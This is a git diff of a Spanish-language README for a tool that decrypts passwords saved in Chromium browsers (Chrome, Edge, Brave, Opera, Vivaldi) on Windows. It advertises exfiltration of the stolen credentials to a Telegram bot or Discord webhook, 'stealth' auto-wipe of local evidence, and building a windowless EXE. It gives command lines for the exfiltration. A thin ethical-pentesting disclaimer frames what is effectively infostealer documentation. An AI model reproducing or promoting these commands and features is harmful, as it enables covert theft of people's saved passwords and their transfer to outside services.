@@ -1,90 +1,113 @@
 # 🛡️ Chromium Credentials Auditor Suite
 
-Una herramienta profesional y modular diseñada para la extracción, descifrado y exfiltración de credenciales almacenadas en navegadores basados en **Chromium**. Optimizada para auditorías de seguridad en entornos controlados y pentesting ético.
+<div align="center">
+
+![Windows](https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)
+![Python](https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white)
+![SQLite](https://img.shields.io/badge/SQLite-07405E?style=for-the-badge&logo=sqlite&logoColor=white)
+![Telegram](https://img.shields.io/badge/Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white)
+![Discord](https://img.shields.io/badge/Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white)
+
+*Una suite avanzada para auditorías de seguridad profesional y pentesting ético en entornos Windows.*
+
+[Reportar Bug](https://github.com/ANONIMO432HZ/decrypt-chromium-suite/issues) | [Solicitar Mejora](https://github.com/ANONIMO432HZ/decrypt-chromium-suite/issues)
+
+</div>
 
 ---
 
-## ✨ Características Principales
+## 💻 Compatibilidad del Sistema
 
-*   **🌐 Soporte Multi-Navegador**: Extrae automáticamente credenciales de:
-    *   Google Chrome
-    *   Microsoft Edge
-    *   Brave Browser
-    *   Opera & Opera GX
-    *   Vivaldi
-*   **🔌 Exfiltración Modular**: Soporte nativo para:
-    *   **Telegram**: Envío de reportes directamente a un bot.
-    *   **Discord**: Integración con Webhooks.
-*   **📊 Reportes Flexibles**:
-    *   **HTML Premium**: Genera reportes interactivos y estéticos para el cliente final.
-    *   **CSV Estándar**: Para análisis de datos crudos.
-*   **🕵️ Modo Sigilo (Stealth)**:
-    *   Limpieza automática de artefactos temporales.
-    *   Borrado automático del reporte local tras una exfiltración exitosa (opcional).
+| Sistema Operativo | Versiones Soportadas | Arquitectura |
+| :--- | :--- | :--- |
+| 🪟 **Windows** | Windows 10 / Windows 11 | x64 / x86 |
+| 🌐 **Chromium** | v80 o superior (AES-GCM) | Todas |
 
 ---
 
-## 🚀 Instalación y Uso
+## ✨ Navegadores Soportados
 
-### 1. Clonar e Instalar Dependencias
+La suite escanea y descifra automáticamente los siguientes objetivos:
+
+*   🌐 **Google Chrome** (Canary, Beta, Stable)
+*   🌐 **Microsoft Edge**
+*   🦁 **Brave Browser**
+*   ⭕ **Opera & Opera GX**
+*   📐 **Vivaldi**
+
+---
+
+## 🚀 Características Premium
+
+*   **📡 Exfiltración Modular**: 
+    *   Envío instantáneo de reportes vía **Bot de Telegram** o **Webhooks de Discord**.
+*   **📊 Reportes Dinámicos**: 
+    *   Generación de informes estéticos en **HTML Interactivo** o archivos **CSV**.
+*   **🕵️ Arquitectura de Sigilo (Stealth)**: 
+    *   Limpieza automática de bases de datos temporales y **Auto-Wipe** del reporte local tras exfiltración.
+
+---
+
+## 🛠️ Stack Tecnológico
+
+| Componente | Tecnología Utilizada |
+| :--- | :--- |
+| **Lenguaje** | `Python 3.x` |
+| **Seguridad de OS** | `Windows DPAPI` via `PyWin32` |
+| **Criptografía** | `AES-GCM 256` via `PyCryptodomex` |
+| **Comunicación** | `Telegram API` & `Discord Webhooks` |
+| **Packaging** | `PyInstaller` (Standalone EXE) |
+
+---
+
+## ⚙️ Guía de Uso Rápido
+
+### 1. Instalación de Dependencias
 ```bash
-git clone https://github.com/ANONIMO432HZ/decrypt-chromium-suite.git
-cd decrypt-chromium-suite
 pip install -r requirements.txt
 ```
 
-### 2. Comandos de Uso
+### 2. Comandos Magistrales
 
-**Auditoría Local (Reporte HTML):**
+> **Generar Reporte HTML Estético:**
 ```bash
-python main.py -f html -o reporte_auditoria
+python main.py -f html -o reporte_final
 ```
 
-**Auditoría con Exfiltración a Telegram:**
+> **Exfiltración Remota vía Telegram:**
 ```bash
-python main.py --telegram-token "TOKEN" --telegram-chatid "ID"
-```
-
-**Auditoría con Exfiltración a Discord y modo Verboso:**
-```bash
-python main.py --discord "WEBHOOK_URL" -v
+python main.py --telegram-token "TU_TOKEN" --telegram-chatid "TU_ID"
 ```
 
 ---
 
-## 📦 Compilación a Ejecutable (.exe)
+## 📦 Compilación Profesional (.exe)
 
-Para ejecutar esta suite en entornos sin Python instalado, puedes compilarla en un único archivo portable:
-
-1.  Instala PyInstaller:
-    ```bash
-    pip install pyinstaller
-    ```
-2.  Compila el proyecto:
-    ```bash
-    pyinstaller --onefile --noconsole main.py
-    ```
-3.  Busca tu ejecutable en la carpeta `dist/main.exe`.
+```bash
+# Compilación a un solo archivo (.exe) portable
+pyinstaller --onefile --noconsole --name "ChromiumAuditor" main.py
+```
 
 ---
 
-## 🚦 Parámetros Disponibles
+## 🚦 Panel de Argumentos CLI
 
-| Argumento | Descripción |
-| :--- | :--- |
-| `-f`, `--format` | Formato de salida: `html` (por defecto) o `csv`. |
-| `-o`, `--output` | Nombre base del archivo de reporte. |
-| `--telegram-token` | Token del bot de Telegram para exfiltración. |
-| `--telegram-chatid` | ID del chat de Telegram para recibir el archivo. |
-| `--discord` | URL del Webhook de Discord. |
-| `--no-wipe` | Evita que el reporte se borre localmente tras enviarse por red. |
-| `-v`, `--verbose` | Muestra logs detallados de captura en consola. |
-
----
-
-## ⚖️ Descargo de Responsabilidad Ética
-
-Esta herramienta ha sido desarrollada estrictamente para **fines educativos y de auditoría de seguridad profesional**. El autor no se hace responsable del uso indebido de esta herramienta. **Nunca utilices este software sin el consentimiento explícito del propietario del sistema.**
+| Icono | Argumento | Descripción |
+| :--- | :--- | :--- |
+| 📄 | `-f`, `--format` | Formatos: `html` (interactivo) o `csv`. |
+| 📁 | `-o`, `--output` | Nombre base del archivo de salida. |
+| 🤖 | `--telegram-token` | Token del bot (API Telegram). |
+| 🆔 | `--telegram-chatid` | ID de chat (API Telegram). |
+| 🔗 | `--discord` | URL del Webhook de Discord. |
+| 🧹 | `--no-wipe` | Desactiva el auto-borrado post-exfiltración. |
+| 🛠️ | `-v`, `--verbose` | Logs detallados en consola. |
 
 ---
-*Mantenido por el equipo de Auditoría Digital.*
+
+## ⚖️ Aviso Legal y Ético
+
+> [!CAUTION]
+> **ESTE SOFTWARE ES PARA FINES DE PENTESTING ÉTICO Y AUDITORÍA PROFESIONAL.** 
+> El uso de esta herramienta para acceder a sistemas sin la autorización explícita del propietario es ilegal. El autor no asume responsabilidad por el mal uso de esta suite.
+
+---
